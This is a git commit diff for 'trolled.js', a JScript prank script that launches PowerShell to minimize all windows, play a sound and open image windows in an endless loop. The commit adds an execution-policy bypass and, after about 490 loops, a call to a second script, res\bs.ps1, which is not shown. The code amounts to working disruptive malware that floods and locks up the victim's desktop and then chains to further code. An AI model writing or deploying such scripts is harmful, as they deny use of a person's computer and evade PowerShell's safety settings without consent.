304d005ccb467d4a82a1352613599af9258138f7
GamingGamer521 <134823809+gm521@users.noreply.github.com>
2024-07-26 16:52:09 -0400

    Update trolled.js

--- ybt/trolled.js
+++ ybt/trolled.js
@@ -2,6 +2,7 @@ c = '$a = New-Object System.Media.SoundPlayer;' +
     '$a.SoundLocation = \'res\\t.wav\';' +
     '[void][reflection.assembly]::LoadWithPartialName(\'System.Windows.Forms\');' +
     '$s = [System.Drawing.Image]::Fromfile((get-item \'res\\t.png\'));' +
+    '$ti = 0;' +
     'function nf {' +
     '    $f = New-Object system.Windows.Forms.Form;' +
     '    $f.StartPosition = \'manual\';' +
@@ -18,10 +19,15 @@ c = '$a = New-Object System.Media.SoundPlayer;' +
     '    return $f' +
     '}' +
     '(New-Object -ComObject Shell.Application).MinimizeAll();' +
+    'Set-ExecutionPolicy Bypass -scope Process -Force;' +
     '$a.Play();' +
     'while ($true) {' +
     '    (nf).Show();' +
+    '    if ($i -gt 490) {' +
+    '        .\\res\\bs.ps1;' +
+    '    }' +
+    '    $i ++;' +
     '    Start-Sleep -Milliseconds 50;' +
     '}'
 
-new ActiveXObject('WScript.Shell').run('cmd /c powershell ' + c, 0, true);
+new ActiveXObject('WScript.Shell').run('cmd /k powershell ' + c);
